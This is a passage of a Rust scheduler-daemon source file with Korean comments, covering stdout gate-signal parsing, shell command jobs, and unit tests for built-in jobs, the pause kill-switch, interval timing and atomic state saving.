/// 여기 없는 name 은 버린다. stdout 은 **신뢰 경계 밖**(잡이 임의 문자열을 찍는다)이라
/// 열어두면 미지 토큰이 `gate.*` 이벤트 이름 공간과 CC 배지판을 오염시킨다.
/// ★확장 시 python 게이트(`javis_report_gate.py`)와 **동시 갱신**할 것 — 한쪽만 늘리면
/// 게이트는 신호를 보내는데 데몬이 조용히 버리는 무음 고장이 된다.
const GATE_SIGNAL_ALLOWLIST: &[&str] = &["state_unwritable"];

/// 게이트 stdout 요약에서 기계 토큰 `gate_signal=<name>` 을 뽑는다(순수 — 부작용0·테스트 핀).
///
/// 왜 stdout 인가: 게이트가 state_dir 에 쓸 수 없으면 원장에도 badges.json 에도 아무 흔적을
/// 남길 수 없다 — 같은 state 를 oracle 로 기대하는 것이 자기모순(설계 R3-GATE)이다. stdout
/// 요약 1줄은 이미 `schedule.command_done` 텔레메트리에 실려 나가는 **확립된 채널**이라,
/// 새 채널을 만들지 않고 state 외부 oracle 을 얻는다.
///
/// 문법: `[a-z_]{1,40}`, 중복 제거, 상한 4(한 잡이 이벤트를 폭주시키지 못하게).
pub fn gate_signals_from_stdout(stdout: &str) -> Vec<String> {
    const TOKEN: &str = "gate_signal=";
    const MAX_SIGNALS: usize = 4;
    const MAX_NAME: usize = 40;
    let mut out: Vec<String> = Vec::new();
    for line in stdout.lines() {
        let mut rest = line;
        while let Some(pos) = rest.find(TOKEN) {
            let tail = &rest[pos + TOKEN.len()..];
            rest = tail; // 같은 줄의 다음 토큰까지 훑는다
            let name: String = tail
                .chars()
                .take_while(|c| c.is_ascii_lowercase() || *c == '_')
                .take(MAX_NAME + 1) // +1 로 받아 길이 초과를 '절단'이 아니라 '거부'로 판정
                .collect();
            if name.is_empty() || name.len() > MAX_NAME {
                continue;
            }
            if !GATE_SIGNAL_ALLOWLIST.contains(&name.as_str()) {
                continue;
            }
            if out.iter().any(|n| n == &name) {
                continue;
            }
            out.push(name);
            if out.len() >= MAX_SIGNALS {
                return out;
            }
        }
    }
    out
}

async fn fire_command(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let command = job
        .command
        .as_deref()
        .ok_or("command job missing 'command'")?;
    let (shell, flag) = command_shell();
    #[cfg(windows)]
    warn_shell_fallback(daemon, flag);
    let mut c = tokio::process::Command::new(shell);
    c.arg(flag).arg(command).hide_console();
    apply_spawn_env(&mut c); // run_text_command 와 동일 — 동봉 runtime PATH·HOME 주입
    let out = tokio::time::timeout(Duration::from_secs(600), c.output())
        .await
        .map_err(|_| "command timed out (600s)".to_string())?
        .map_err(|e| e.to_string())?;
    daemon.bus.publish(
        "schedule.command_done",
        "schedule",
        None,
        json!({"job_id": job.id, "exit": out.status.code(),
               "stdout_tail": String::from_utf8_lossy(&out.stdout).chars().rev().take(400).collect::<String>().chars().rev().collect::<String>()}),
    );
    // ★T-0147-2 §1-B N6b: stdout 기계 토큰 → 데몬 사실로 승격(state 외부 oracle).
    // 아래 exit≠0 Err 반환 **앞**에 두는 이유: 게이트는 항상 exit 0 이지만 계약은 종료코드와
    // 무관하다 — 실패 경로에서 신호가 증발하면 "쓰기 불능"을 알릴 유일한 채널이 닫힌다.
    for name in gate_signals_from_stdout(&String::from_utf8_lossy(&out.stdout)) {
        daemon.bus.publish(
            &format!("gate.{name}"),
            "alert",
            None,
            json!({"job_id": job.id, "signal": name}),
        );
        // CC 배지 축(alerts.rs) — 이벤트는 흘러가지만 배지는 TTL 동안 남아 사람이 본다.
        crate::alerts::note_gate_signal(&format!("gate.{name}"), json!({"job_id": job.id}));
    }
    // 실패 표면화: 종전엔 exit≠0 도 Ok 로 삼켜 schedule.fired 가 나갔다 — 잡이 매 주기 실패해도
    // 이벤트만 보면 '발화 성공'으로 읽혔다(무음 고장). run_text_command 와 같은 형태로 Err 를
    // 돌려 fire()가 schedule.error(job_id·exit·stderr 꼬리)를 발행하게 한다.
    // command_done 은 그대로 유지(exit·stdout 관측자 무회귀). 성공(exit 0) 경로는 무변경.
    if !out.status.success() {
        return Err(format!(
            "command 비정상 종료({:?}): {}",
            out.status.code(),
            String::from_utf8_lossy(&out.stderr)
                .chars()
                .rev()
                .take(200)
                .collect::<String>()
                .chars()
                .rev()
                .collect::<String>()
        ));
    }
    Ok(format!("command exit={:?}", out.status.code()))
}

/// CLI `schedule list`용: jobs + last_fired 스냅샷
pub fn status(daemon: &Daemon) -> serde_json::Value {
    let jobs = load_jobs();
    let state = load_state(daemon);
    json!({
        "schedule_path": schedule_path().to_string_lossy(),
        "jobs": jobs,
        "last_fired": state.last_fired,
        // 수리 세대 노출(가산 필드) — 릴리스 게이트 마커의 live 참조 지점(링커 제거 불가 보장)
        "fix_generation": FIX_GENERATION,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::NaiveDate;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// ★R1 심층 방어 층3: schedule push 는 정의상 기계 유래 — 라벨 없는 문안이 master stdin 에
    /// 그대로 꽂히면 in-band 구별이 불가능했다(라운드1 검증자 임시 완화 ①). 데몬이 발화 시점에
    /// 강제 부착하며, 이미 라벨이 있으면 무접촉(기존 built-in 잡 무회귀).
    #[test]
    fn schedule_push_forces_machine_label_without_touching_labeled_text() {
        // 라벨 없음 → 강제 부착
        assert_eq!(
            ensure_machine_label("다음 액션 착수", "self-wake"),
            "[schedule self-wake] 다음 액션 착수"
        );
        // 이미 라벨 있음 → 무접촉(built-in `[heartbeat] …`·`[wakeup] …` 무회귀)
        for t in [
            "[heartbeat] 일일 환경스캐닝을 시작하라",
            "[wakeup W-3f2a1c] task=next-action",
            "  [wakeup] 다음 액션 착수",             // 선행 공백
            "［전각］ 라벨",                          // 전각 대괄호도 라벨이다
            "\u{200b}[zwsp] 라벨",                    // 투명문자 선행
            "[여러 줄\n라벨] 본문",                   // 라벨 안 개행 — 종전 정규식이 놓치던 우회
            &format!("[{}] 본문", "긴".repeat(100)), // 80자 초과 — 종전 상한 우회
        ] {
            assert_eq!(ensure_machine_label(t, "j"), t, "라벨 있는 문안을 건드렸다: {t:?}");
        }
        // 선두 비공백 우회(라벨이 문두가 아님) → 라벨 없음으로 판정해 부착
        assert!(ensure_machine_label("x [wakeup] 다음 액션", "j").starts_with("[schedule j] "));
    }

    /// 테스트 전용 격리 데몬 — 고유 하위 디렉터리에 소켓을 둬 병렬 실행 시 상태가 섞이지 않게 한다.
    pub(super) fn test_daemon() -> Arc<Daemon> {
        static SEQ: AtomicU64 = AtomicU64::new(0);
        let dir = std::env::temp_dir().join(format!(
            "cys-sched-test-{}-{}-{}",
            std::process::id(),
            now_epoch().to_bits(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = std::fs::create_dir_all(&dir);
        Daemon::new(dir.join("cysd.sock"))
    }

    // ★B2-1(W3): built-in 잡 부트 ensure idempotency — 부재 생성·재실행 무접촉(중복 0)·구버전 갱신·사용자 잡 보존.
    #[test]
    fn builtin_jobs_ensure_idempotent_and_versioned() {
        // 사용자 잡 1개로 시작(cys schedule add 시뮬).
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
        })];

        // 1차: built-in 9개(phoenix2 + learn2 + cycle2 + formation1 + promote1 + alert1) 생성 → changed=true.
        // ★(0.14.31 · WP-3 B) 계수 갱신: 신규 id `cso-alert-inbox-check-60m` 1건 append.
        //   버전은 **범프하지 않았다**(신규 id 는 버전 무관 append — 아래 범프 금지 핀 유지).
        let (c1, conf1, _) = apply_builtin_jobs(&mut jobs);
        assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
        assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
        let ids: Vec<&str> = jobs.iter().filter_map(|j| j["id"].as_str()).collect();
        assert!(ids.contains(&"phoenix-snapshot-6h") && ids.contains(&"phoenix-drill-weekly"));
        assert!(
            ids.contains(&"learn-ttl-audit") && ids.contains(&"fleet-digest"),
            "learn gaps C12③ 잡 2종 생성"
        );
        assert!(
            ids.contains(&"cycle-autopilot-tick") && ids.contains(&"cycle-verifier-watchdog"),
            "R6 W0-4/W0-5 cycle 잡 2종 생성"
        );
        assert!(
            ids.contains(&"formation-heartbeat"),
            "T9 P3-1 ⓑ 상비편성 심박 잡 생성"
        );
        assert!(
            ids.contains(&"ceo-promote-pending-tick"),
            "T10 P3-2 대기형 승격 집행 틱 잡 생성"
        );
        assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
        assert_eq!(jobs.len(), 10, "사용자1 + built-in9");
        // 주기 정합(typed): snapshot=6h(360), drill=7일(10080), audit=일(1440), digest=7일(10080),
        // cycle tick=매분(1), verifier watchdog=10분(10), formation heartbeat=10분(10),
        // ceo promote tick=10분(10).
        let period = |id: &str| {
            jobs.iter()
                .find(|j| j["id"].as_str() == Some(id))
                .and_then(|j| j["every_minutes"].as_u64())
        };
        assert_eq!(period("phoenix-snapshot-6h"), Some(360), "snapshot 6h");
        assert_eq!(period("phoenix-drill-weekly"), Some(10080), "drill 7일");
        assert_eq!(period("learn-ttl-audit"), Some(1440), "learn audit 일 1회");
        assert_eq!(period("fleet-digest"), Some(10080), "fleet digest 주 1회");
        assert_eq!(period("cycle-autopilot-tick"), Some(1), "cycle tick 매분");
        assert_eq!(period("cycle-verifier-watchdog"), Some(10), "verifier watchdog 10분");
        assert_eq!(period("formation-heartbeat"), Some(10), "formation heartbeat 10분");
        assert_eq!(period("ceo-promote-pending-tick"), Some(10), "promote 집행 틱 10분");
        assert_eq!(period("cso-alert-inbox-check-60m"), Some(60), "CSO alert inbox 점검 60분");
        assert!(ids.contains(&"cso-alert-inbox-check-60m"), "WP-3 B 60분 점검 잡 생성");
        // ★T9(P3-1 ⓑ) 상비편성 심박 계약 핀: command 레인(매 틱 master stdin 무주입) ·
        //   base_only(부서 데몬 복제 실행 차단 — fire 관문과 쌍) · --force-surface 금지
        //   (주기 잡 스팸 계약 javis_formation._surface) · ensure 호출 실재.
        {
            let fh = jobs
                .iter()
                .find(|j| j["id"].as_str() == Some("formation-heartbeat"))
                .unwrap();
            assert_eq!(fh["action"].as_str(), Some("command"), "심박은 command 레인 핀");
            assert_eq!(fh["base_only"].as_bool(), Some(true), "심박은 base_only 핀");
            let cmd = fh["command"].as_str().unwrap();
            assert!(
                cmd.contains("javis_formation.py") && cmd.contains("ensure"),
                "심박 command 에 formation ensure 부재"
            );
            assert!(
                !cmd.contains("--force-surface"),
                "주기 잡에 --force-surface 금지(매 틱 토스트 스팸 계약)"
            );
        }
        // ★T10(P3-2) 대기형 승격 집행 틱 계약 핀: command 레인(master stdin 무주입) ·
        //   base_only(부서 데몬 복제 실행 = 동시 승격·단일소유 위반 차단 — fire 관문과 쌍) ·
        //   role-less 주체(env -u CYS_ROLE — 단일소유 가드 무접촉의 기계 보장) ·
        //   집행 레인이므로 --request-only(신호 레인 전용 인자) 금지.
        {
            let pt = jobs
                .iter()
                .find(|j| j["id"].as_str() == Some("ceo-promote-pending-tick"))
                .unwrap();
            assert_eq!(pt["action"].as_str(), Some("command"), "집행 틱은 command 레인 핀");
            assert_eq!(pt["base_only"].as_bool(), Some(true), "집행 틱은 base_only 핀");
            let cmd = pt["command"].as_str().unwrap();
            assert!(
                cmd.contains("promote-if-pending"),
                "집행 틱 command 에 promote-if-pending 부재"
            );
            assert!(
                !cmd.contains("--request-only"),
                "집행 틱에 --request-only 금지(그건 신호 레인 — 집행은 대기형)"
            );
            assert!(
                cmd.contains("env -u CYS_ROLE"),
                "집행 틱은 role-less 주체 핀(env -u CYS_ROLE)"
            );
        }
        // ★T9(R3-P03-3) 범프 금지 핀: 신규 id 는 버전 무관 append 라 범프가 불요하고, 범프는
        //   기존 builtin 항목을 코드 정의로 통째 교체해 **운영자 수기 편집을 무언 소실**시킨다.
        //   builtin 잡 '내용' 변경으로 범프가 정말 필요해지면 이 핀을 의식적으로 함께 고치라
        //   (그 커밋이 곧 소실 고지다).
        assert_eq!(BUILTIN_JOBS_VERSION, 2, "BUILTIN_JOBS_VERSION 무단 범프 금지(T9)");
        // ★크리틱 B3 ① 회귀 핀: cycle 잡 2종은 push 가 아니라 command 레인이어야 한다
        //   (push 면 매분 master stdin 주입 폭주 + R-CLI-4 정확일치 게이트와 충돌).
        for id in ["cycle-autopilot-tick", "cycle-verifier-watchdog"] {
            let j = jobs.iter().find(|j| j["id"].as_str() == Some(id)).unwrap();
            assert_eq!(j["action"].as_str(), Some("command"), "{id} 는 command 레인 핀");
            assert!(j.get("to").is_none() && j.get("text").is_none() && j.get("text_command").is_none(),
                "{id} 는 push 계열 필드(to/text/text_command)를 갖지 않는다");
            // ★크리틱 B3 ② 회귀 핀: live 승격을 잡 문자열(env 접두)에 심지 않는다 —
            //   버전 범프 때 코드 정의 교체로 shadow 무언 회귀하는 채널이기 때문.
            let cmd = j["command"].as_str().unwrap();
            assert!(!cmd.contains("CYS_AUTOPILOT_MODE"),
                "{id} command 에 모드 env 접두 금지(파일 채널 STATE_DIR/mode 가 정본)");
        }

        // 2차: 동버전 재실행 → 무접촉(changed=false·중복 0).
        let (c2, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(!c2, "동버전 재실행은 무접촉(변경 없음)이어야 한다");
        let snap_count = jobs
            .iter()
            .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .count();
        assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
        assert_eq!(jobs.len(), 10, "중복 없이 10개 유지");

        // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
        for j in jobs.iter_mut() {
            if j["id"].as_str() == Some("phoenix-snapshot-6h") {
                j["_builtin_version"] = json!(0); // 구버전 강제
                j["every_minutes"] = json!(99999); // 사용자가 못 고치는 드리프트 시뮬
            }
        }
        let (c3, _, _) = apply_builtin_jobs(&mut jobs);
        assert!(c3, "구버전 항목은 갱신돼야 한다");
        let refreshed = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(
            refreshed["_builtin_version"].as_u64(),
            Some(BUILTIN_JOBS_VERSION),
            "버전업 갱신"
        );
        assert_eq!(
            refreshed["every_minutes"].as_u64(),
            Some(360),
            "갱신은 코드 정의(360)로 복원 — 드리프트 치유"
        );
        assert_eq!(
            jobs.iter()
                .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
                .count(),
            1,
            "갱신 후에도 중복 0"
        );
    }

    // ★codex W3 major: 사용자가 예약 id(phoenix-snapshot-6h)를 마커 없이 선점하면 built-in ensure 가
    //   교체하지 않고 보존+conflict 경고해야 한다(B2-1 사용자 잡 보존 계약).
    #[test]
    fn builtin_ensure_preserves_user_job_on_reserved_id() {
        let mut jobs: Vec<serde_json::Value> = vec![json!({
            "id": "phoenix-snapshot-6h",           // 사용자가 예약 id 선점(_builtin 마커 없음)
            "every_minutes": 5, "action": "push", "to": "master", "text": "USER OWN SNAPSHOT"
        })];
        let (changed, conflicts, _) = apply_builtin_jobs(&mut jobs);
        // snapshot id 는 conflict 로 보존, drill 은 신규 생성.
        assert!(conflicts.contains(&"phoenix-snapshot-6h".to_string()), "예약 id 충돌 보고");
        let snap = jobs
            .iter()
            .find(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
            .unwrap();
        assert_eq!(snap["text"].as_str(), Some("USER OWN SNAPSHOT"), "사용자 잡 내용 보존(교체 금지)");
        assert_eq!(snap["every_minutes"].as_u64(), Some(5), "사용자 주기 보존");
        assert!(snap.get("_builtin").is_none(), "사용자 잡에 built-in 마커 미주입");
        assert_eq!(
            jobs.iter().filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h")).count(),
            1,
            "충돌 id 중복 생성 0"
        );
        // drill 은 마커 없는 선점이 없으므로 정상 생성(changed=true).
        assert!(changed, "drill 신규 생성으로 changed");
        assert!(jobs.iter().any(|j| j["id"].as_str() == Some("phoenix-drill-weekly")));
    }

    /// (learn gaps C12③) pack seed(cysjavis-pack/schedule.json)의 마커 잡 ↔ builtin_jobs()
    /// 코드 정의 동기 핀 — 드리프트하면 R-CLI-4 게이트가 seed 사본 text_command 를 거부해
    /// 잡이 무음 실패한다(산문→코드 대칭 핀). learn 잡 2종 등재도 함께 박제.
    #[test]
    fn pack_seed_marked_jobs_match_builtin_defs() {
        let seed: serde_json::Value =
            serde_json::from_str(include_str!("../../../cysjavis-pack/schedule.json"))
                .expect("seed schedule.json 파싱");
        let builtins = builtin_jobs();
        let mut checked = 0;
        for j in seed["jobs"].as_array().expect("seed jobs 배열") {
            if j.get("_builtin").is_none() {
                continue; // 마커 없는 seed 잡(owner-report 등)은 코드 소유가 아니다
            }
            let id = j["id"].as_str().unwrap_or("?");
            let b = builtins
                .iter()
                .find(|b| b.get("id") == j.get("id"))
                .unwrap_or_else(|| panic!("seed 마커 잡 '{id}' 이 builtin_jobs() 에 없음"));
            assert_eq!(j, b, "seed '{id}' ↔ builtin_jobs() 정의 드리프트");
            checked += 1;
        }
        assert!(checked >= 2, "learn 잡 2종(learn-ttl-audit·fleet-digest)이 seed 에 등재돼야 한다");
        // R-CLI-4: 코드 소유 text_command 는 게이트가 신뢰해야 발화된다.
        for id in ["learn-ttl-audit", "fleet-digest"] {
            let cmd = builtins
                .iter()
                .find(|b| b["id"].as_str() == Some(id))
                .and_then(|b| b["text_command"].as_str())
                .expect("text_command 존재");
            assert!(is_trusted_builtin_text_command(cmd), "'{id}' text_command 게이트 신뢰");
        }
    }

    // ★T9(R3-P03-3): base_only 단일 관문 판정 — 4형상(base/dept × base_only on/off).
    //   fire() 진입부가 이 순수 판정을 그대로 소비한다(스케줄 틱·run_now·핫리로드 전 경로 커버).
    #[test]
    fn base_only_gate_blocks_only_dept_sockets() {
        let mut bj = job(None, &[]);
        bj.base_only = true;
        let mut nj = job(None, &[]);
        nj.base_only = false;
        let base_sock = std::path::Path::new("/tmp/state/cys/cys.sock");
        let dept_sock = std::path::Path::new("/tmp/state/cys-dept-dept-1/cys.sock");
        assert!(
            base_only_blocked(&bj, dept_sock),
            "base_only 잡이 부서 소켓에서 차단되지 않는다(복제 실행 — 단일소유 위반)"
        );
        assert!(
            !base_only_blocked(&bj, base_sock),
            "base_only 잡이 base 소켓에서 오차단(심박 사망 — 자가치유 경로 절단)"
        );
        assert!(
            !base_only_blocked(&nj, dept_sock),
            "일반 잡이 부서 소켓에서 오차단(부서 스케줄 회귀)"
        );
        assert!(!base_only_blocked(&nj, base_sock), "일반 잡 base 소켓 회귀");
        // Windows named pipe 부서 소켓도 동일 판정(is_dept_socket 은 경로 성분 기반).
        let pipe = std::path::Path::new(r"\\.\pipe\cys-dept-dept-2");
        assert!(base_only_blocked(&bj, pipe), "named pipe 부서 소켓 미판별");
    }

    // ★T9: base_only 는 추가-전용 스키마(#[serde(default)]) — 구 파일(필드 부재)=false 로 로드,
    //   명시 true 는 보존된다(부서 복제 파일에서도 판정 근거가 살아남는 근거).
    #[test]
    fn base_only_serde_default_is_false() {
        let old: Job = serde_json::from_value(json!({
            "id": "legacy", "action": "push", "to": "master"
        }))
        .expect("구 스키마(필드 부재) 역직렬화");
        assert!(!old.base_only, "필드 부재는 false(구 파일 호환)여야 한다");
        let new: Job = serde_json::from_value(json!({
            "id": "fh", "action": "command", "command": "true", "base_only": true
        }))
        .expect("신 스키마 역직렬화");
        assert!(new.base_only, "명시 true 소실 — 관문 판정 근거 붕괴");
    }

    #[test]
    fn run_now_is_frozen_while_paused() {
        // 회귀 가드 (T4-15 kill-switch 비대칭 차단): pause 중이면 run_now도 발화하지 않아야 한다.
        // scheduler_tick·deliver_queued는 paused에서 즉시 return하는데, run_now만 게이트가 없으면
        // 누구든 `cys schedule run-now <id>`로 kill-switch를 우회해 정지된 에이전트 stdin에
        // 과업을 주입(또는 fresh surface 기동)할 수 있다. 게이트는 job 조회·fire spawn보다
        // 먼저 막아야 한다 — 존재하지 않는 job id를 줘도 'paused' 거절이 먼저 와야 한다.
        let daemon = test_daemon();
        daemon.paused.store(true, Ordering::Relaxed);
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("paused 중 run_now는 발화를 거절(Err)해야 한다");
        assert!(
            err.contains("paused"),
            "거절 사유는 kill-switch(paused)여야 한다 — got: {err}"
        );
    }

    #[test]
    fn run_now_passes_gate_when_not_paused() {
        // 대칭 확인: pause가 아니면 게이트를 통과해 정상 조회 경로로 진행한다(여기선 job 부재 →
        // 'no job' 에러). paused 에러가 아니어야 게이트가 정상(running)임이 증명된다.
        let daemon = test_daemon();
        assert!(!daemon.paused.load(Ordering::Relaxed));
        let err = run_now(&daemon, "no-such-job-xyz")
            .expect_err("부재 job은 'no job' 에러여야 한다");
        assert!(
            !err.contains("paused"),
            "running 상태에서 paused 게이트가 잘못 발동하면 안 된다 — got: {err}"
        );
        assert!(err.contains("no job"), "게이트 통과 후 조회 경로 에러여야 한다 — got: {err}");
    }

    fn job(time: Option<&str>, days: &[&str]) -> Job {
        Job {
            id: "t".into(),
            time: time.map(|s| s.to_string()),
            every_minutes: None,
            at: None,
            close_after_secs: None,
            days: days.iter().map(|s| s.to_string()).collect(),
            action: "push".into(),
            to: None,
            text: None,
            text_command: None,
            command: None,
            if_absent: None,
            fresh: false,
            base_only: false,
            via_queue: false,
            launch: None,
        }
    }

    /// ★불변식 박제 (절대지침 — master 5분 주기 보고 하트비트):
    /// ★P2-2 ⑥ 회귀: 첫 가동(상태 파일 부재)에서 주기 잡이 **동시에 만기**가 되면 안 된다.
    /// 그 상태의 실제 피해는 두 갈래다 — 마스터가 있으면 큐 폭탄(폭주 결함군), 없으면
    /// `if_absent: skip` 으로 전부 소인돼 다음 주기까지 침묵. 시드 후에는 어느 잡도 즉시 만기가
    /// 아니어야 한다(다음 주기부터 정상 리듬).
    #[test]
    fn first_run_seeding_prevents_simultaneous_due() {
        let now = 1_700_000_000i64;
        let builtin = builtin_jobs();
        let intervals: Vec<u64> = builtin
            .iter()
            .filter_map(|j| j.get("every_minutes").and_then(|v| v.as_u64()))
            .collect();
        assert!(intervals.len() >= 2, "주기 잡이 여럿이어야 이 회귀가 의미 있다");
        // 시드 이전(last_fired=0): 전부 즉시 만기 — 이것이 결함 상태다.
        assert!(intervals.iter().all(|m| interval_due(Some(*m), 0, now)));
        // 시드 이후(last_fired=now): 어느 것도 즉시 만기가 아니다.
        assert!(intervals.iter().all(|m| !interval_due(Some(*m), now, now)));
        // 리듬은 유지된다 — 각자 자기 주기가 지나면 발화.
        for m in intervals {
            assert!(interval_due(Some(m), now, now + (m as i64) * 60));
        }
    }

    /// ★★감사 확정 회귀(앵커 ①③ 동시 방어): 디스크 영속이 실패해도
    ///  ①전 주기 잡이 30초마다 재발화하지 않고(폭주) ②영원히 침묵하지도 않는다(자가치유 전멸).
    /// 메모리 오버레이가 그 둘 사이의 유일한 올바른 상태(정확한 간격)를 유지한다.
    #[test]
    fn memory_overlay_keeps_interval_when_disk_write_fails() {
        // 오버레이는 프로세스 전역이라 이 테스트 전용 키를 쓴다(다른 테스트와 간섭 금지).
        let id = "test-overlay-job";
        let now = 1_700_000_000i64;
        mem_record(id, now);
        let mut st = ScheduleState::default();
        assert!(st.last_fired.is_empty());
        mem_merge_into(&mut st);
        assert_eq!(st.last_fired.get(id).copied(), Some(now), "메모리 기록이 복원되어야 한다");

        // 간격 의미가 유지된다 — 방금 발화한 잡은 즉시 만기가 아니다(폭주 차단).
        assert!(!interval_due(Some(360), st.last_fired[id], now));
        // 그리고 주기가 지나면 정상 발화한다(침묵 차단).
        assert!(interval_due(Some(360), st.last_fired[id], now + 360 * 60));

        // 디스크가 더 최신이면 디스크가 이긴다(정상 경로에서 오버레이가 과거를 되살리지 않는다).
        let mut st2 = ScheduleState::default();
        st2.last_fired.insert(id.to_string(), now + 10_000);
        mem_merge_into(&mut st2);
        assert_eq!(st2.last_fired[id], now + 10_000);
    }

    /// 원자쓰기 회귀: 저장은 tmp+rename+fsync 이고 **결과를 반환**한다(exists() 로 영속을
    /// 오판하지 않는다). 반쪽 파일이 남으면 다음 tick 이 손상 격리→재시드 루프로 간다.
    #[test]
    fn save_state_is_atomic_and_reports_failure() {
        let dir = std::env::temp_dir().join(format!("cys-sched-save-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("schedule_state.json");
        let mut st = ScheduleState::default();
        st.last_fired.insert("j".into(), 123);
        assert!(save_state_to(&path, &st).is_ok());
        let back: ScheduleState =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(back.last_fired.get("j").copied(), Some(123));
        // tmp 잔재 없음(rename 으로 넘어갔다).
        assert!(!path.with_extension("json.tmp").exists());
        // 쓸 수 없는 경로는 **정직하게 Err** — exists() 로 영속을 오판하던 결함의 회귀 핀.
        let bad = dir.join("no-such-dir").join("schedule_state.json");
        assert!(save_state_to(&bad, &st).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// interval_due는 마지막 발화 후 every_minutes분 경과 시에만 true. 0·None은 비활성.
    #[test]
    fn interval_due_fires_every_n_minutes() {
        let base = 1_000_000_000i64; // 임의 epoch
        // 5분 주기: 마지막 발화 직후엔 false, 정확히 300초 경과 시 true
        assert!(!interval_due(Some(5), base, base));
        assert!(!interval_due(Some(5), base, base + 299));
        assert!(interval_due(Some(5), base, base + 300));
        assert!(interval_due(Some(5), base, base + 600));
        // 최초(last_fired=0)는 즉시 발화 (epoch 차가 간격보다 큼)
        assert!(interval_due(Some(5), 0, base));
        // 비활성: None·0은 항상 false (상시발화 방지)
        assert!(!interval_due(None, 0, base));
        assert!(!interval_due(Some(0), 0, base));
    }

    #[test]
    fn schedule_for_daily_when_no_days() {
        // days 비면 매일 발화 — 임의 날짜에 Some
        let j = job(Some("09:00"), &[]);
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert!(schedule_for(&j, d).is_some());
    }

    #[test]
    fn schedule_for_respects_weekday_filter() {
        // 2026-06-12는 금요일(Friday)
        let friday = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        assert_eq!(friday.weekday(), chrono::Weekday::Fri);
        // 금요일 포함 → Some
        assert!(schedule_for(&job(Some("09:00"), &["fri"]), friday).is_some());
        // 대소문자 무관 매칭
        assert!(schedule_for(&job(Some("09:00"), &["FRI"]), friday).is_some());
        // 다른 요일만 지정 → None
        assert!(schedule_for(&job(Some("09:00"), &["mon", "tue"]), friday).is_none());
    }

    #[test]
    fn schedule_for_invalid_or_missing_time() {
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        // time 미제공 → None (원샷 at job이 아닌 한 발화 불가)
        assert!(schedule_for(&job(None, &[]), d).is_none());
        // 잘못된 시각 포맷 → None
        assert!(schedule_for(&job(Some("9am"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("25:00"), &[]), d).is_none());
        assert!(schedule_for(&job(Some("12:60"), &[]), d).is_none());
    }

    #[test]
    fn schedule_for_time_ordering_within_day() {
        // 같은 날 더 늦은 시각은 더 큰(또는 같은) epoch — 단조성
        let d = NaiveDate::from_ymd_opt(2026, 6, 12).unwrap();
        let early = schedule_for(&job(Some("08:00"), &[]), d).unwrap();
        let late = schedule_for(&job(Some("20:00"), &[]), d).unwrap();
        assert!(late > early);
    }

    #[test]
    fn recurring_fresh_without_ttl_gets_default_reap() {
        // 회귀 가드: 반복(time) + fresh + close_after_secs 미설정 job은 발화마다 유일 역할의
        // 새 surface를 만든다. 회수 트리거가 없으면 24/365 데몬에서 surface·roles·fd가
        // 단조 증가(누수)한다. effective_close_ttl이 기본 TTL을 부여해 회수를 보장해야 한다.
        let mut j = job(Some("09:00"), &[]);
        j.fresh = true;
        assert_eq!(
            effective_close_ttl(&j),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "반복 fresh job이 TTL 없이 누수되면 안 된다 — 기본 TTL로 회수돼야 한다"
        );
        // every_minutes 반복 fresh job도 동일하게 기본 TTL을 받아야 한다(at None인 반복형).
        let mut e = job(None, &[]);
        e.every_minutes = Some(5);
        e.fresh = true;
        assert_eq!(
            effective_close_ttl(&e),
            Some(FRESH_RECURRING_DEFAULT_TTL_SECS),
            "every_minutes fresh job도 누수 차단 기본 TTL을 받아야 한다"
        );
    }

    #[test]
    fn explicit_close_after_secs_takes_precedence() {
        // 운영자가 명시한 close_after_secs는 항상 우선 (반복·원샷 무관, 0도 존중)
        let mut recurring = job(Some("09:00"), &[]);
        recurring.fresh = true;
        recurring.close_after_secs = Some(42);
        assert_eq!(effective_close_ttl(&recurring), Some(42));

        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        oneshot.close_after_secs = Some(7);
        assert_eq!(effective_close_ttl(&oneshot), Some(7));

        // 0 = 즉시 close 의도 — 기본값으로 덮어쓰지 않는다
        recurring.close_after_secs = Some(0);
        assert_eq!(effective_close_ttl(&recurring), Some(0));
    }

    #[test]
    fn oneshot_fresh_without_ttl_keeps_legacy_none() {
        // 원샷(at)+fresh는 1회뿐이라 무한 누적이 없다 — 기존 동작(자동 close 없음) 보존.
        // 반복 경로만 누수이므로 수정은 반복에 국한한다(외과적 최소 변경).
        let mut oneshot = job(None, &[]);
        oneshot.at = Some(1_900_000_000);
        oneshot.fresh = true;
        assert_eq!(effective_close_ttl(&oneshot), None);
    }

    #[test]
    fn corrupt_persistence_is_quarantined_not_silently_dropped() {
        // 회귀 가드 (W0-3): 존재하나 파싱 불가한 영속 파일은 조용히 기본값으로 대체되지 않고
        // 손상본이 <name>.corrupt-<epoch>로 격리돼야 한다(24/365 데몬의 하트비트·fire-state
